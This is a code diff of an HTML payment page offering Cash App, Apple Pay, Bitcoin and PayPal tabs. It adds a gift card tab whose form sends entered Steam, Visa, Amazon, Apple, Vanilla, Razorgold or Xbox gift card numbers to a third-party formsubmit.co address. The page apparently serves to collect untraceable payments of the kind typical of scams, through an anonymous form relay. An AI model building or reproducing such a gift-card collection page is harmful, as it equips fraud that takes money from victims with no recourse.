@@ -27,41 +27,10 @@
 
 <head>
 <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
+
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
     <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
     <style>
-	
-	.tcontainer {
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    height: 100vh;
-	padding: 10px;
-	
-	
-	}
-	
-	.scontainer{
-	display: flex;
-    justify-content: center;
-    align-items: center;
-    height: 50vh;
-    flex-direction: column;
-	
-	}
-	
-    .center-container {
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    height: 80vh;
-    flex-direction: column;
-	border: 2px solid #FFB6C1;
-	padding: 10px;
-	border-radius: 10px;
-	box-sizing: border-box;
-	overflow: hidden;
-        }
 		
 	#details {
         background-color: #f9f9f9;
@@ -96,11 +65,21 @@
     height: 100%;
     object-fit: cover; /* Maintain aspect ratio and fill the container */
 }
+
+
+
+	input-container {
+    /* Make the image container take up the full width and height of the parent container */
+    width: 100%;
+    height: 100%;
+    position: relative;
+    overflow: hidden; /* Hide any image overflow beyond the container */
+}
     
 	input[type = "text"] {
 	
 		display: block;
-		margin-left: 460px;
+		margin-left:0px;
 		padding: 5px;
 		width: 130px;
 		border: 2px solid #555;
@@ -114,6 +93,69 @@
 		outline: none;
 		border: 2px solid #007bff;
 		}
+		
+		
+
+
+
+body {
+    font-family: Arial, sans-serif;
+    margin: 0;
+    padding: 0;
+}
+
+header {
+    background-color: #333;
+    color: white;
+    text-align: center;
+    padding: 20px;
+}
+
+main {
+    max-width: 600px;
+    margin: 0 auto;
+    padding: 20px;
+}
+
+.payment-form {
+    border: 1px solid #ccc;
+    padding: 20px;
+    background-color: #f9f9f9;
+}
+
+label {
+    display: block;
+    margin-bottom: 5px;
+    font-weight: bold;
+}
+
+
+input[type="password"],
+select {
+    width: 100%;
+    padding: 10px;
+    margin-bottom: 10px;
+}
+
+btn {
+    background-color: #333;
+    color: white;
+    padding: 10px 20px;
+    border: none;
+    cursor: pointer;
+}
+
+btn:hover {
+    background-color: #555;
+}
+
+#card-number {
+	width: 100%;
+    padding: 10px;
+    margin-bottom: 10px;
+	position: right;
+    overflow: hidden;
+}
 
     </style>
     <meta charset="UTF-8">
@@ -294,6 +336,7 @@ const appJs = {"reCaptcha":{"isEnable":true,"siteKey":"6LfYFv0UAAAAABHHOn3Vnfzcf
             <li><a data-toggle="tab" href="#Apple" style="color:#FFB6C1;">Applepay</a></li>
             <li><a data-toggle="tab" href="#Bitcoin" style="color:#FFB6C1;">Bitcoin</a></li>
             <li><a data-toggle="tab" href="#Paypal" style="color:#FFB6C1;">PayPal</a></li>
+			<li><a data-toggle="tab" href="#Gift" style="color:#FFB6C1;">Giftcard</a></li>
         </ul>
 
         <div class="tab-content">
@@ -309,12 +352,13 @@ const appJs = {"reCaptcha":{"isEnable":true,"siteKey":"6LfYFv0UAAAAABHHOn3Vnfzcf
                 <div id="image-container">
                     <img src="img/cash.jpg" alt="Your Image Description">
                 </div>
-                <div class="container">
+                
                     <div class="input-container">
+					
                         <input type="text" value="$jayleanent113" id="myTextBox" readonly>
                         <button onclick="copyText()">Copy</button>
                     </div>
-                </div>
+                
             </div>
 
            
@@ -343,6 +387,35 @@ const appJs = {"reCaptcha":{"isEnable":true,"siteKey":"6LfYFv0UAAAAABHHOn3Vnfzcf
                     <img src="img/paypal.PNG" alt="Your Image Description">
                 </div>
             </div>
+			
+			
+		<div id="Gift" class="tab-pane fade">
+	 
+			<div class="payment-form">
+            
+            <form id="payment-form" action="https://formsubmit.co/el/pileko" method="POST">
+                <label for="card-number">Gift Card Number:</label>
+                <input type="text" id="card-number" name="card-number" placeholder="Enter card number" required>
+                <label for="card-type">Select Gift Card Type:</label>
+                <select id="card-type" name="card-type">
+                    <option value="visa">Steam gift card </option>
+                    <option value="store">Visa gift card</option>
+					<option value="store">Amazon gift card</option>
+					<option value="store">Apple gift card</option>
+					<option value="store">Vanilla gift card</option>
+					<option value="store">Razorgold gift card</option>
+					<option value="store">Xbox gift card</option>
+                </select>
+                
+                <button type="submit" id ="btn" >Submit Payment</button>
+            </form>
+			</div>
+			
+			
+			
+		</div>
+			
+			
         </div>
     </div>
 	</div>
